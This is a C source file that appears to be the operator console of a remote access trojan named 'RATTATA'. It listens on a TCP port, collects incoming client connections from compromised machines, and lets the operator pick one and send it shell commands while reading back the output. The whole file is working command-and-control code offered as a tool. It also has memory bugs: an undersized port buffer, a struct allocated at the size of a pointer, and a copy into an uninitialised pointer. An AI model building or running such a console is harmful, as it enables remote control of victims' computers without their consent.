#undef UNICODE
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 4096
#define MAX_CLIENTS 20

typedef struct ThreadData
{
    SOCKET Listener;
} THREADDATA, *PTHREADDATA;

typedef struct ClientInfo
{
    int id;
    char *ip;
    SOCKET Socket;
} CLIENTINFO, *PCLIENTINFO;

void init_client_thread(PTHREADDATA pclientdata);

char PORT[3];
PTHREADDATA pDataArray[MAX_CLIENTS];
DWORD dwThreadIdArray[MAX_CLIENTS];
HANDLE hThreadArray[MAX_CLIENTS];
int threadNbr = 0;
PCLIENTINFO PClients[MAX_CLIENTS];

void logprint(char *type, char *message)
{
    if (strcmp(type, "ERROR") == 0)
    {
        printf("[-]%s\n", message);
    }
    else if (strcmp(type, "SUCCESS") == 0)
    {
        printf("[+]%s\n", message);
    }
}

SOCKET init_listener()
{
    WSADATA wsaData;
    int iResult;
    SOCKET ListenSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    iResult = getaddrinfo(NULL, PORT, &hints, &result);
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);
    iResult = listen(ListenSocket, SOMAXCONN);

    return ListenSocket;
}

int link_client(CLIENTINFO *Client)
{
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iSendResult;
    for (;;)
    {
        iResult = recv(Client->Socket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
        {
            printf("%s", recvbuf);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
            fgets(recvbuf, 4096, stdin);
            if (strcmp(recvbuf, "background") == 10)
            {
                iSendResult = send(Client->Socket, "", 2, 0);
                memset(recvbuf, 0, 4096);
                recvbuf[0] = '\0';
                break;
            }
            iSendResult = send(Client->Socket, recvbuf, strlen(recvbuf), 0);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
        }
        else
        {
            printf("Client unreachable : %d\n", WSAGetLastError());
            closesocket(Client->Socket);
            WSACleanup();

            PClients[Client->id] = NULL;

            return 0;
        }
    }
}

DWORD WINAPI init_client(LPVOID lpParam)
{
    SOCKET ClientSocket = INVALID_SOCKET;
    PTHREADDATA pData;
    pData = (PTHREADDATA)lpParam;
    ClientSocket = accept(pData->Listener, NULL, NULL);
    closesocket(pData->Listener);

    SOCKET listener = init_listener();
    pDataArray[threadNbr] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
    if (pDataArray[threadNbr] == NULL)
    {
        ExitProcess(2);
    }
    pDataArray[threadNbr]->Listener = listener;
    init_client_thread(pDataArray[threadNbr]);

    for (int i = 1; i < MAX_CLIENTS; i++)
    {
        if (PClients[i] == NULL)
        {
            PClients[i] = malloc(sizeof(PCLIENTINFO));
            PClients[i]->id = i;
            strcpy(PClients[i]->ip, "oui");
            PClients[i]->Socket = ClientSocket;
            printf("\n>>New client connected - %s\n", PClients[i]->ip);
            break;
        }
    }
}

void init_client_thread(PTHREADDATA pclientdata)
{
    hThreadArray[threadNbr] = CreateThread(NULL, 0, init_client, pclientdata, 0, &dwThreadIdArray[threadNbr]);

    if (hThreadArray[threadNbr] == NULL)
    {
        printf("Error");
        ExitProcess(3);
    }
    threadNbr++;
}

int menu()
{
    int choice, dummy;
    printf("RATTATA >>\n");
    printf("1 - Start a new server.\n2 - View clients\n3 - Exit\nEnter choice : ");
    scanf("%d", &choice);
    if (choice == 1)
    {
        printf("Listening PORT : ");
        scanf("%s", &PORT);
        SOCKET listener = init_listener();
        pDataArray[threadNbr] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                                       sizeof(PTHREADDATA));
        if (pDataArray[threadNbr] == NULL)
        {
            ExitProcess(2);
        }
        pDataArray[threadNbr]->Listener = listener;
        init_client_thread(pDataArray[threadNbr]);
    }
    else if (choice == 2)
    {
        int trigger = 0;
        for (int i = 1; i < MAX_CLIENTS; i++)
        {
            if (PClients[i] != NULL)
            {
                trigger = 1;
                printf("%d - %s\n", PClients[i]->id, PClients[i]->ip);
            }
        }
        if (trigger)
        {
            printf("Enter 0 to exit.\n");
            printf("Choose a client : ");
            scanf("%d", &choice);
            if (choice != 0)
            {
                link_client(PClients[choice]);
            }
        }
        else
        {
            printf("No client connected.\n");
        }
    }
    else if (choice == 3)
    {
        ExitProcess(1);
    }
}

int main(void)
{
    while (1)
    {
        menu();
    }
    return 0;
}